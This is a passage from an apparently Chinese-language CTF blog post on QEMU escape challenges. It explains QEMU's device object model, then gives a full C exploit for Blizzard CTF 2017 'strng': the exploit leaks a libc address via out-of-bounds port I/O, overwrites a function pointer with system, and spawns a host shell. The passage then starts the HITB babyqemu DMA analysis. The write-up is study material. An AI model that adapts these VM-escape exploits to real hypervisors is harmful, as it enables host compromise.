{</span></span><br><span class="line">    DeviceClass parent_class;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*realize)(PCIDevice *dev, Error **errp);</span><br><span class="line">    <span class="type">int</span> (*init)(PCIDevice *dev);<span class="comment">/* TODO convert to realize() and remove */</span></span><br><span class="line">    PCIUnregisterFunc *<span class="built_in">exit</span>;</span><br><span class="line">    PCIConfigReadFunc *config_read;</span><br><span class="line">    PCIConfigWriteFunc *config_write;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint16_t</span> vendor_id;</span><br><span class="line">    <span class="type">uint16_t</span> device_id;</span><br><span class="line">    <span class="type">uint8_t</span> revision;</span><br><span class="line">    <span class="type">uint16_t</span> class_id;</span><br><span class="line">    <span class="type">uint16_t</span> subsystem_vendor_id;       <span class="comment">/* only for header type = 0 */</span></span><br><span class="line">    <span class="type">uint16_t</span> subsystem_id;              <span class="comment">/* only for header type = 0 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * pci-to-pci bridge or normal device.</span></span><br><span class="line"><span class="comment">     * This doesn't mean pci host switch.</span></span><br><span class="line"><span class="comment">     * When card bus bridge is supported, this would be enhanced.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">int</span> is_bridge;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* pcie stuff */</span></span><br><span class="line">    <span class="type">int</span> is_express;   <span class="comment">/* is this device pci express? */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* rom bar */</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *romfile;</span><br><span class="line">} PCIDeviceClass;</span><br></pre></td></tr></tbody></table></figure><p>设备被识别时注册mmio,pmio的区域和函数表.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> MemoryRegionOps strng_mmio_ops = {</span><br><span class="line">    .read = strng_mmio_read,</span><br><span class="line">    .write = strng_mmio_write,</span><br><span class="line">    .endianness = DEVICE_NATIVE_ENDIAN,</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> MemoryRegionOps strng_pmio_ops = {</span><br><span class="line">    .read = strng_pmio_read,</span><br><span class="line">    .write = strng_pmio_write,</span><br><span class="line">    .endianness = DEVICE_LITTLE_ENDIAN,</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">pci_strng_realize</span><span class="params">(PCIDevice *pdev, Error **errp)</span></span><br><span class="line">{</span><br><span class="line">    STRNGState *strng = DO_UPCAST(STRNGState, pdev, pdev);</span><br><span class="line"></span><br><span class="line">    memory_region_init_io(&amp;strng-&gt;mmio, OBJECT(strng), &amp;strng_mmio_ops, strng, <span class="string">"strng-mmio"</span>, STRNG_MMIO_SIZE);</span><br><span class="line">    pci_register_bar(pdev, <span class="number">0</span>, PCI_BASE_ADDRESS_SPACE_MEMORY, &amp;strng-&gt;mmio);</span><br><span class="line">    memory_region_init_io(&amp;strng-&gt;pmio, OBJECT(strng), &amp;strng_pmio_ops, strng, <span class="string">"strng-pmio"</span>, STRNG_PMIO_SIZE);</span><br><span class="line">    pci_register_bar(pdev, <span class="number">1</span>, PCI_BASE_ADDRESS_SPACE_IO, &amp;strng-&gt;pmio);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>实例的初始化.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> STRNG(obj) OBJECT_CHECK(STRNGState, obj, <span class="string">"strng"</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">strng_instance_init</span><span class="params">(Object *obj)</span></span><br><span class="line">{</span><br><span class="line">    STRNGState *strng = STRNG(obj);</span><br><span class="line"></span><br><span class="line">    strng-&gt;srand = srand;</span><br><span class="line">    strng-&gt;rand = rand;</span><br><span class="line">    strng-&gt;rand_r = rand_r;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>完成上述步骤后设备实例初始化完毕,若客户机读写设备注册的MMIO区域或与PMIO端口,Qemu回调设备函数表中的相应函数.</p><p>比较让人混淆的是TypeImpl,instance,XXXClass的概念.<br>可以从class_init函数切入.类的初始化函数,听起来有点莫名其妙,咱们平时所说的初始化一般都是初始化类的对象,好像没有初始化类的说法.<br>因为平时所说的类的概念,是语言本身提供的,在编译期实现,可以指定类有哪些成员,成员变量的初值,类的构造函数.而Qemu是在运行中实现类的概念.<br>根据设置的TypeInfo信息创建的TypeImpl对象是XXX类定义的一部分,包含类名,类大小,类的初始化函数及类实例(对象)的初始化函数(构造函数)等.class_init函数的工作,相当于完成语言中定义类时为成员变量设置默认初值的工作,也包括父类的虚函数的赋值.而instance_init则类似于构造函数,用来初始化一个该类型的实例(对象).</p><p>总结起来,从面向对象语言的角度来看,XXXClass,TypeImpl实际上都属于类的定义,instance是类的对象.</p><h2 id="Blizzard-CTF-2017-Strng"><a href="#Blizzard-CTF-2017-Strng" class="headerlink" title="Blizzard CTF 2017 Strng"></a>Blizzard CTF 2017 Strng</h2><h3 id="一些信息搜集"><a href="#一些信息搜集" class="headerlink" title="一些信息搜集"></a>一些信息搜集</h3><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311261732331.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311261739772.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311261739286.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311261740983.png"></p><p>MMIO地址为0xfebf1000，大小为256；PMIO地址为0xc050，总共有8个端口.<br>查看内存  start-address — end-address — flags<br>或者 /proc/iomem,/proc/ioports<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311261743445.png"></p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>看pmio_read和pmio_write,一眼越界读写,write时设置qpaque-&gt;addr,之后再作为下标进行任意读写.还给了能布置参数的函数指针调用,先读函数指针泄露地址再改函数指针执行system(‘sh’).</p><p>解释一下这两个函数的参数.addr是要操作的port - portbase(PMIO),size是这次IO操作的字节数,val是要写入的值.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311271703440.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311271704300.png"></p><p>顺便提一下,mmio_read看起来也很像越界读写,但其实addr是有限制的,因为只有在读写MMIO区域时Qemu模拟才会调用这俩函数.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311271708372.png"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>有个不合理但其实也合理但我不接受的点是,32位下编译,uint64_t == unsigned long即32位无符号整型…</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HEX(x) printf(<span class="string">"[*]0x%016llx\n"</span>, (unsigned long long)x)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOG(addr) printf(<span class="string">"[*]%s\n"</span>, addr)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SHIFT 12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PFN_PFN ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOWMASK 0xffffffff</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HIGHMASK 0xffffffff00000000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">uint64_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> pmio_base = <span class="number">0x000000000000c050</span>;</span><br><span class="line"><span class="type">void</span> * mmio_mem;</span><br><span class="line"><span class="type">char</span>* userbuf;</span><br><span class="line"><span class="type">uint64_t</span> phy_userbuf;</span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Err</span><span class="params">(<span class="type">char</span>* err)</span>{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Error: %s\n"</span>, err);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">page_offset</span><span class="params">(<span class="type">uint32_t</span> addr)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">return</span> addr &amp; ((<span class="number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="number">1</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">gva_to_gfn</span><span class="params">(<span class="type">void</span> *addr)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">uint64_t</span> pme, gfn;</span><br><span class="line">    <span class="type">size_t</span> offset;</span><br><span class="line">    offset = ((<span class="type">uintptr_t</span>)addr &gt;&gt; <span class="number">9</span>) &amp; ~<span class="number">7</span>;</span><br><span class="line">    <span class="comment">// ((uintptr_t)addr &gt;&gt; 12)&lt;&lt;3</span></span><br><span class="line">    lseek(fd, offset, SEEK_SET);</span><br><span class="line">    read(fd, &amp;pme, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (!(pme &amp; PFN_PRESENT))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    gfn = pme &amp; PFN_PFN;</span><br><span class="line">    <span class="keyword">return</span> gfn;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* transfer visual address to physic address</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">gva_to_gpa</span><span class="params">(<span class="type">void</span> *addr)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">uint64_t</span> gfn = gva_to_gfn(addr);</span><br><span class="line">    <span class="keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="type">uint64_t</span>)addr);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">va2pa</span><span class="params">(<span class="type">void</span> *addr)</span>{</span><br><span class="line">    <span class="type">uint64_t</span> data;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> pagesize = getpagesize();</span><br><span class="line">    <span class="type">size_t</span> offset = ((<span class="type">uintptr_t</span>)addr / pagesize) * <span class="keyword">sizeof</span>(<span class="type">uint64_t</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(lseek(fd,offset,SEEK_SET) &lt; <span class="number">0</span>){</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"lseek"</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(read(fd,&amp;data,<span class="number">8</span>) != <span class="number">8</span>){</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"read"</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(data &amp; (((<span class="type">uint64_t</span>)<span class="number">1</span> &lt;&lt; <span class="number">63</span>)))){</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"page"</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> pageframenum = data &amp; ((<span class="number">1ull</span> &lt;&lt; <span class="number">55</span>) - <span class="number">1</span>);</span><br><span class="line">    <span class="type">size_t</span> phyaddr = pageframenum * pagesize + (<span class="type">uintptr_t</span>)addr % pagesize;</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> phyaddr;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint32_t</span> addr)</span>{</span><br><span class="line">    <span class="keyword">return</span> *( (<span class="type">uint32_t</span> *)mmio_mem + addr );</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint32_t</span> addr,<span class="type">uint32_t</span> val )</span>{</span><br><span class="line">    *((<span class="type">uint32_t</span> *)mmio_mem + addr) = val;</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_write</span><span class="params">(<span class="type">uint32_t</span> addr,<span class="type">uint32_t</span> val)</span>{</span><br><span class="line">    outl(val,addr);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_writeb</span><span class="params">(<span class="type">uint32_t</span> addr,<span class="type">uint8_t</span> val)</span>{</span><br><span class="line">    outb(val,addr);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">pmio_read</span><span class="params">(<span class="type">uint32_t</span> addr)</span>{</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">uint32_t</span>)inl(addr);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">pmio_readb</span><span class="params">(<span class="type">uint32_t</span> addr)</span>{</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">uint8_t</span>)inb(addr);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_mmio</span><span class="params">()</span>{</span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">"/sys/devices/pci0000:00/0000:00:04.0/resource0"</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span>(mmio_fd &lt; <span class="number">0</span>){</span><br><span class="line">        Err(<span class="string">"Open pci"</span>);</span><br><span class="line">    }</span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(mmio_mem&lt;<span class="number">0</span>){</span><br><span class="line">        Err(<span class="string">"mmap mmio_mem"</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">pmio_arbread</span><span class="params">(<span class="type">uint32_t</span> offset)</span></span><br><span class="line">{</span><br><span class="line">    pmio_write(pmio_base,offset);</span><br><span class="line">    <span class="keyword">return</span> pmio_read(pmio_base+<span class="number">4</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_arbwrite</span><span class="params">(<span class="type">uint32_t</span> offset,<span class="type">uint32_t</span> val)</span></span><br><span class="line">{</span><br><span class="line">    pmio_write(pmio_base,offset);</span><br><span class="line">    pmio_write(pmio_base+<span class="number">4</span>,val);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) !=<span class="number">0</span> )</span><br><span class="line">        Err(<span class="string">"I/O permission is not enough"</span>);</span><br><span class="line">    <span class="type">uint64_t</span> srand_addr = <span class="number">0</span>;</span><br><span class="line">    srand_addr |= pmio_arbread((<span class="number">0xBF8</span><span class="number">-0xAF4</span>));</span><br><span class="line">    srand_addr |= (pmio_arbread(((<span class="number">0xBF8</span><span class="number">-0xAF4</span>))+<span class="number">4</span>) &lt;&lt; <span class="number">32</span>);</span><br><span class="line">    HEX(srand_addr);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> system_addr = srand_addr+<span class="number">0xacd0</span>ULL;</span><br><span class="line">    LOG(<span class="string">"system:"</span>);</span><br><span class="line">    HEX(system_addr);</span><br><span class="line"></span><br><span class="line">    LOG(<span class="string">"Prepare:"</span>);</span><br><span class="line">    <span class="comment">// uint64_t binsh_addr = srand_addr+0x1925f8;</span></span><br><span class="line">    pmio_arbwrite((<span class="number">0xc08</span><span class="number">-0xAF4</span>),system_addr&amp;LOWMASK);</span><br><span class="line">    pmio_arbwrite(((<span class="number">0xc08</span><span class="number">-0xAF4</span>))+<span class="number">4</span>,(system_addr&gt;&gt;<span class="number">32</span>));</span><br><span class="line">    pmio_arbwrite(<span class="number">2</span>*<span class="number">4</span>,<span class="number">0x6873</span>);</span><br><span class="line">    LOG(<span class="string">"Triger:"</span>);</span><br><span class="line">    pmio_arbwrite(<span class="number">3</span>*<span class="number">4</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>还有一个不是很理解的点,system(‘sh’)后没办法正常交互(感觉Qemu进程异常退出后就经常出现这种情况),因为此时输入回车发送的实际上是’\r’,但shell是以’\n’终止的,所以会一直等待输入,不过可以用ctrl+J发送’\n’…<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311271628072.png"><br>改用python交互或者直接system(‘cat /flag’)或CTRL+J.</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">io = process(<span class="string">'./launch.sh'</span>,shell=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">'ubuntu login: '</span>,<span class="string">b'ubuntu'</span>)</span><br><span class="line">io.sendlineafter(<span class="string">'Password:'</span>,<span class="string">b'passw0rd'</span>)</span><br><span class="line">io.sendlineafter(<span class="string">'$'</span>,<span class="string">'sudo ./exp'</span>)</span><br><span class="line">pause()</span><br><span class="line">io.send(<span class="string">'cat /flag\n'</span>)</span><br><span class="line"></span><br><span class="line">flag = io.recv()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><h2 id="HITB-GSEC2017-babyqemu"><a href="#HITB-GSEC2017-babyqemu" class="headerlink" title="HITB GSEC2017 babyqemu"></a>HITB GSEC2017 babyqemu</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>依赖库的版本太老了,懒得一个一个换,关掉kvm用docker来跑,<br>刚开始的方案是gdbserver启远程调试,一个比较阴间问题的是gdb continue阻塞时要用SIGINT来取消,target remote也是用SIGINT来终止,一阻塞就断开连接,调得很难受.<br>(如果有人知道咋解决可以告诉我一下~)</p><p>后来仔细一想,Docker的隔离只是命名空间而已,容器的pid命名空间对主机是可见的,可以直接attach上去.</p><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>关键结构体belike:</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">attribute__</span>((<span class="title">aligned</span>(16))) <span class="title">HitbState</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">  PCIDevice_0 pdev;</span><br><span class="line">  MemoryRegion_0 mmio;</span><br><span class="line">  QemuThread_0 thread;</span><br><span class="line">  QemuMutex_0 thr_mutex;</span><br><span class="line">  QemuCond_0 thr_cond;</span><br><span class="line">  <span class="type">bool</span> stopping;</span><br><span class="line">  <span class="type">uint32_t</span> addr4;</span><br><span class="line">  <span class="type">uint32_t</span> fact;</span><br><span class="line">  <span class="type">uint32_t</span> status;</span><br><span class="line">  <span class="type">uint32_t</span> irq_status;</span><br><span class="line">  dma_state dma;</span><br><span class="line">  QEMUTimer_0 dma_timer;</span><br><span class="line">  <span class="type">char</span> dma_buf[<span class="number">4096</span>];</span><br><span class="line">  <span class="type">void</span> (*enc)(<span class="type">char</span> *, <span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line">  <span class="type">uint64_t</span> dma_mask;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dma_state</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">  <span class="type">dma_addr_t</span> src;</span><br><span class="line">  <span class="type">dma_addr_t</span> dst;</span><br><span class="line">  <span class="type">dma_addr_t</span> cnt;</span><br><span class="line">  <span class="type">dma_addr_t</span> cmd;</span><br><span class="line">};</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>hitb设备只有mmio交互,功能就是读取和设置dma_state结构体的四个成员.write还有一个关键命令,可以设置timer的到期时间(100ms之后)<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311281759682.png"></p><p>再来看这个timer,realize函数中可以注册了回调函数hitb_dma_timer,刻度1ms<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311281756440.png"></p><p>漏洞点就在这个hitb_dma_timer了.两个功能,从物理地址读取数据到dma_buf,将dma_buf中的数据写入到物理地址.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">cpu_physical_memory_rw</span><span class="params">(hwaddr addr, <span class="type">uint8_t</span> *buf,<span class="type">int</span> len, <span class="type">int</span> is_write)</span>;</span><br></pre></td></tr></tbody></table></figure><p>dma_buf的索引在write和read的时候分别是dma_state.src和dma_state.dst(从src/dst得到索引的操作其实是相同的,伪C代码有点逆天).<br>没有限制,所以可以越界读写.还是越界读写一个函数指针enc,改到system的PLT表即可.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311281756532.png"></p><p>顺便练下gpa到hva的转换,这里的gpa是0x1f72d90<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311281632876.png"><br>查看Qemu进程的vmmap找到Guest的物理空间,(64MB = 0x40*0x1000*0x1000B)<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311281632289.png"><br>计算hva == gpa+hpa,查看写入前该地址的8字节数据<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311281632904.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311281633037.png"><br>写入后再次查看,已经被修改为hitb_enc.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311281633367.png"></p><p>在write操作增加timer时间后要进行sleep,来等待timer回调</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>(多提一句,exp中的copy_from_dma其实应该是copy_to_dma_buf</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 